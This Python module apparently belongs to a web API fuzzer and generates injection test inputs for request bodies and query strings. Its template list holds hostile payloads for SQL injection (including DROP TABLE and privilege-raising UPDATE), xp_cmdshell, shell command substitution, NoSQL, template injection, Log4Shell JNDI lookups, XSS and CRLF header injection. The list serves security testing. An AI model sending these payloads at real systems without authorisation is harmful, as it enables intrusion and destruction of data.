from __future__ import annotations

from typing import Any
from typing import Callable
from typing import Iterator

from rsfuzzer.mutations.strategies.base import _merge_body
from rsfuzzer.mutations.types import MutationTrace


def _named_templates() -> Iterator[tuple[str, Callable[[str], str]]]:
    yield "sqli_or_eq", lambda m: f"' OR '{m}'='{m}"
    yield "sqli_or_dq", lambda m: f"\" OR \"{m}\"=\"{m}"
    yield "sqli_waitfor", lambda m: f"'; WAITFOR DELAY '0:0:{m}'--"
    yield "ssti_mustache", lambda m: f"{{{{{m}}}}}"
    yield "ssti_dollar", lambda m: f"${{{m}}}"
    yield "sqli_tautology", lambda _m: "' OR 1=1--"
    yield "sqli_drop", lambda m: f"'; DROP TABLE {m}--"
    yield "nosql_gt", lambda _m: '{"$gt": ""}'
    yield "nosql_ne", lambda _m: '{"$ne": null}'
    yield "cmd_pipe", lambda m: f"| {m}"
    yield "cmd_backtick", lambda m: f"`{m}`"
    yield "cmd_dollar", lambda m: f"$({m})"
    yield "path_unix", lambda m: f"../{m}"
    yield "path_win", lambda m: f"..\\{m}"
    yield "mssql_shell", lambda m: f"'; exec xp_cmdshell '{m}'--"
    yield "ldap_or", lambda m: f"*)(uid=*))(|(uid=*"
    yield "sqli_union", lambda m: f"' UNION SELECT NULL,NULL,'{m}'--"
    yield "sqli_pg_sleep", lambda m: f"';SELECT pg_sleep({m})--"
    yield "sqli_mysql_sleep", lambda m: f"' OR SLEEP({m})--"
    yield "sqli_stacked", lambda m: f"1; UPDATE users SET role='admin' WHERE id={m}--"
    yield "nosql_where", lambda _m: '{"$where": "sleep(1000)"}'
    yield "nosql_regex", lambda _m: '{"$regex": "^.*$"}'
    yield "nosql_in", lambda _m: '{"$in": ["admin", "root"]}'
    yield "ssti_jinja_math", lambda _m: "{{7*7}}"
    yield "ssti_jinja_quote", lambda _m: "{{7*'7'}}"
    yield "ssti_erb", lambda m: f"<%= {m} %>"
    yield "ssti_freemarker", lambda m: f"<#assign x={m}>${{x}}"
    yield "el_spel", lambda m: f"#{{{m}}}"
    yield "log4shell_jndi", lambda m: f"${{jndi:ldap://{m}.example.com/a}}"
    yield "log4shell_env", lambda _m: "${jndi:ldap://${env:USER}.example.com/a}"
    yield "xss_img_onerror", lambda m: f"<img src=x onerror=alert('{m}')>"
    yield "xss_script", lambda _m: "<script>alert(document.domain)</script>"
    yield "xss_svg", lambda _m: "<svg/onload=alert(1)>"
    yield "crlf_header_inject", lambda m: f"%0d%0aX-Injected:{m}%0d%0aSet-Cookie:role=admin"
    yield "xpath_auth_bypass", lambda _m: "' or '1'='1"
    yield "graphql_introspection", lambda _m: "{__schema{types{name}}}"
    yield "format_string", lambda _m: "%n%n%s%s%x%x"
    yield "expr_ognl", lambda m: f"%{{{m}}}"


def _markers() -> Iterator[str]:
    for i in range(8):
        yield f"m{i}"
    yield "x"
    yield "admin"


class InjectionStrategy:
    id = "injection"
    category = "injection"

    def __init__(
        self,
        inject_key: str = "_injection",
        *,
        max_templates: int | None = None,
        max_markers: int | None = None,
    ) -> None:
        self.inject_key = inject_key
        self.max_templates = max_templates
        self.max_markers = max_markers

    def mutate_body(
        self,
        body: dict[str, Any] | None,
    ) -> Iterator[tuple[dict[str, Any], MutationTrace]]:
        base = dict(body) if body else {}
        tpls = list(_named_templates())
        if self.max_templates is not None:
            tpls = tpls[: self.max_templates]
        markers = list(_markers())
        if self.max_markers is not None:
            markers = markers[: self.max_markers]
        for tname, fn in tpls:
            for marker in markers:
                payload = fn(marker)
                merged = _merge_body(base, {self.inject_key: payload})
                trace = MutationTrace(
                    self.id,
                    self.category,
                    {"template": tname, "marker": marker},
                )
                yield merged, trace

    def mutate_query(
        self,
        query: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        tpls = list(_named_templates())[:8]
        if self.max_templates is not None:
            tpls = tpls[: self.max_templates]
        markers = ("1", "x")
        if self.max_markers is not None:
            markers = tuple(list(markers)[: self.max_markers])
        for tname, fn in tpls:
            for marker in markers:
                q = dict(query)
                q["_q"] = fn(marker)
                trace = MutationTrace(self.id, self.category, {"template": tname, "marker": marker})
                yield q, trace

    def mutate_headers(
        self,
        headers: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        yield from ()


def narrow_injection_around(
    base_payload: str,
    charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    radius: int = 8,
) -> Iterator[str]:
    """Local search around an interesting payload (hook for heuristic depth)."""
    yield base_payload
    for c in charset[:radius]:
        yield base_payload + c
        yield c + base_payload
